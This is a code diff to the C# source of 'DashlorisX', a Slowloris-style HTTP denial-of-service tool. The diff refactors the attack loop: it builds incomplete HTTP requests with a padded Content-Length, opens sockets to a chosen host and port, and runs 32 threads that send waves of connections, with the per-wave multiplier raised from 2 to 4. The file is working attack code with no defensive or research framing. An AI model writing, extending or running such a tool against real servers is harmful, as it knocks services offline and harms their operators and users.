@@ -21,74 +21,81 @@ namespace DashlorisX
 { 
     public class PowerPoint
     {
-	readonly List<Thread> workers = new List<Thread>();
-
 	readonly AttackLog LogLog = new AttackLog();
 	readonly DashNet DashNet = new DashNet();
 
 	private string GetHeader()
 	{
-	    var version = Settings.HTTPvBox.Text;
-	    var method = Settings.MethodBox.Text;
-
-	    var host = DashlorisX.HostTextBox.Text;
-
-	    if (host.Contains("http://") || host.Contains("https://"))
+	    try
 	    {
-		host = host.ToLower().Replace("http://", "").Replace("https://", "");
-	    }
+		var version = Settings.HTTPvBox.Text;
+		var method = Settings.MethodBox.Text;
 
-	    var useragent = Settings.UserAgentBox.Text;
-	    var cookie = Settings.CookieBox.Text;
+		var host = DashlorisX.HostTextBox.Text;
 
-	    var bytes = DashlorisX.BytesTextBox.Text;
-
-	    string Optionals()
-	    {
-		if (method == "POST")
+		if (host.Contains("http://") || host.Contains("https://"))
 		{
-		    return string.Format
-		    (
-			"Accept-Encoding: gzip, deflate\r\n" +
-			"Upgrade-Insecure-Requests: 1\r\n"
-		    );
+		    host = host.ToLower().Replace("http://", "").Replace("https://", "");
 		}
 
-		return string.Empty;
+		var useragent = Settings.UserAgentBox.Text;
+		var cookie = Settings.CookieBox.Text;
+
+		var bytes = DashlorisX.BytesTextBox.Text;
+
+		string Optionals()
+		{
+		    if (method == "POST")
+		    {
+			return string.Format
+			(
+			    "Accept-Encoding: gzip, deflate\r\n" +
+			    "Upgrade-Insecure-Requests: 1\r\n"
+			);
+		    }
+
+		    return string.Empty;
+		}
+
+		return string.Format(
+		    $"@1 / @2\r\n".Replace("@1", method).Replace("@2", version) +
+		    $"Host: @\r\n".Replace("@", host) +
+		    $"Content-Length: @\r\n".Replace("@", bytes) +
+		    $"User-Agent: @\r\n".Replace("@", useragent) +
+		    $"{Optionals()}\r\n" +
+		    $"Cookie: @\r\n\r\n".Replace("@", cookie.Replace(" ", ""))
+		);
 	    }
 
-	    return string.Format(
-		$"@1 / @2\r\n".Replace("@1", method).Replace("@2", version) +
-		$"Host: @\r\n".Replace("@", host) +
-		$"Content-Length: @\r\n".Replace("@", bytes) +
-		$"User-Agent: @\r\n".Replace("@", useragent) +
-		$"{Optionals()}\r\n" +
-		$"Cookie: @\r\n\r\n".Replace("@", cookie.Replace(" ", ""))
-	    );
+	    catch (Exception E)
+	    {
+		throw (ErrorHandler.GetException(E));
+	    }
 	}
 
-	readonly List<Socket> longSocks = new List<Socket>();
+	readonly List<Socket> Stockings = new List<Socket>();
+	readonly List<Thread> DashBots = new List<Thread>();
 
 	string host = string.Empty;
 	string port = string.Empty;
 
-	private void SendHeader(Socket longSock)
+	private void SendHeader(Socket stocking)
 	{   
 	    try
 	    {
-		var result = longSock.BeginConnect(host, DashNet.GetInteger(port), null, null);
+		stocking.Ttl = 255;
+		
+		var result = stocking.BeginConnect(host, DashNet.GetInteger(port), null, null);
 		var success = result.AsyncWaitHandle.WaitOne(500, true);
 
-		longSock.Ttl = 255;
-
-		longSocks.Add(longSock);
-
-		if (longSock.Connected)
+		if (stocking.Connected)
 		{
 		    byte[] header = Encoding.ASCII.GetBytes(GetHeader());
-		    
-		    longSock.Send(header);
+
+		    stocking.Send(header);
 		}
+		
+		Stockings.Add(stocking);
 	    }
 
 	    catch
@@ -97,106 +104,150 @@ namespace DashlorisX
 	    }
 	}
 
-	System.Timers.Timer timer = null;
+	System.Timers.Timer DashTimer = null;
 
 	private void StartTimer()
 	{
-	    var duration = DashNet.GetInteger(DashlorisX.DurationTextBox.Text) * 1000;
-
-	    timer = new System.Timers.Timer(duration);
-
-	    timer.Elapsed += (s, e) =>
+	    try
 	    {
-		StopAttack();
-	    };
+		var duration = DashNet.GetInteger(DashlorisX.DurationTextBox.Text) * 1000;
 
-	    timer.AutoReset = false;
-	    timer.Start();
+		DashTimer = new System.Timers.Timer(duration);
+
+		DashTimer.Elapsed += (s, e) =>
+		{
+		    StopAttack();
+		};
+
+		DashTimer.AutoReset = false;
+		DashTimer.Start();
+	    }
+
+	    catch (Exception E)
+	    {
+		throw (ErrorHandler.GetException(E));
+	    }
+	}
+	
+	void LogSend(string text) =>
+	    LogLog.TextLog.AppendText($"{text}\r\n");
+
+	private void StartLatestDashBot()
+	{
+	    if (DashBots.Count > 0)
+	    {
+		DashBots[DashBots.Count - 1].IsBackground = true;
+		DashBots[DashBots.Count - 1].Start();
+
+		DashBots.Clear();
+	    }
+	}
+
+	private void StartDashBots()
+	{
+	    foreach (Thread DashBot in DashBots)
+	    {
+		if (DashBots.IndexOf(DashBot) != 0)
+		{
+		    DashBot.Start();
+		}
+	    }
 	}
 
 	private Socket GetSocket() =>
 	    new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
 
-	void LogSend(string text) =>
-	    LogLog.TextLog.AppendText($"{text}\r\n");
-
-	void StartWorker()
-	{
-	    workers[workers.Count - 1].IsBackground = true;
-	    workers[workers.Count - 1].Start();
-	}
-
 	public void StartAttack()
 	{
-	    host = DashNet.GetIP(DashlorisX.HostTextBox.Text);
-	    port = DashNet.GetPort(DashlorisX.PortTextBox.Text).ToString();
-
-	    LogSend("Starting workers ....");
-
-	    workers.Add(new Thread(() =>
+	    try
 	    {
-		for (int k = 0; k < 32; k += 1)//worker integration
+		host = DashNet.GetIP(DashlorisX.HostTextBox.Text);
+		port = DashNet.GetPort(DashlorisX.PortTextBox.Text).ToString();
+
+		LogSend("Starting workers ....");
+
+		DashBots.Add(new Thread(() =>
 		{
-		    workers.Add(new Thread(() =>
+		    for (int k = 0; k < 32; k += 1)//worker integration
 		    {
-			while (true)
+			DashBots.Add(new Thread(() =>
 			{
-			    for (int request = 0; request < 64; request += 1)
+			    while (true)
 			    {
-				for (int multiplier = 0; multiplier < 2; multiplier += 1)
+				for (int request = 0; request < 64; request += 1)
 				{
-				    SendHeader(GetSocket());
+				    for (int multiplier = 0; multiplier < 4; multiplier += 1)
+				    {
+					SendHeader(GetSocket());
+				    }
+
+				    Thread.Sleep(2000);//inner interval integration
 				}
 
-				Thread.Sleep(2000);//inner interval integration
+				Thread.Sleep(8000);//interval integration
 			    }
+			}));
 
-			    Thread.Sleep(8000);//interval integration
-			}
-		    }));
+			Thread.Sleep(250);//worker portion startup delay
+		    }
 
-		    StartWorker();
-		}
-	    }));
+		    StartDashBots();
+		}));
 
-	    StartWorker();
-	    StartTimer();
+		StartLatestDashBot();
+		StartTimer();
 
-	    LogSend("Sending waves and waves of requests ....");
+		LogSend("Sending waves and waves of requests ....");
 
-	    LogLog.ShowDialog();
+		LogLog.ShowDialog();
+	    }
+
+	    catch (Exception E)
+	    {
+		throw (ErrorHandler.GetException(E));
+	    }
 	}
 
 	public void StopAttack()
-	{
+	{//Asynchronously?
 	    DashlorisX.Launch.Text = "Stopping ....";
 
-	    LogSend($"Stop signal received, stopping {workers.Count} bots ....");
+	    LogSend($"Stop signal received, stopping {DashBots.Count} bots and disconnecting {Stockings.Count} connections ....");
 
-	    try//10.0.2.15
+	    try
 	    {
-		foreach (Socket longSock in longSocks)
+		for (int k = 0; k < Stockings.Count; k += 1)
 		{
-		    longSock.Close();
-		    longSock.Dispose();
+		    Socket Stocking = Stockings[k];
+		    
+		    if (Stocking != null)
+		    {
+			if (Stocking.Connected)
+			{
+			    Stocking.Disconnect(false);
+			    Stocking.Close();
+			}
+		    }
+
+		    Stockings.RemoveAt(k);
 		}
 
-		longSocks.Clear();
-
-		timer.Stop();
-		timer = null;
-
-		foreach (Thread worker in workers)
+		for (int k = 0; k < DashBots.Count; k += 1)
 		{
-		    worker.Abort();
+		    DashBots[k].Abort();
+		    DashBots.RemoveAt(k);
 		}
 
-		workers.Clear();
+		if (DashTimer.Enabled)
+		{
+		    DashTimer.Stop();
+		    DashTimer = null;
+		}
 	    }
 
-	    catch
+	    catch (Exception E)
 	    {
-		//
+		throw (ErrorHandler.GetException(E));
 	    }
 
 	    DashlorisX.Launch.Text = "Launch";
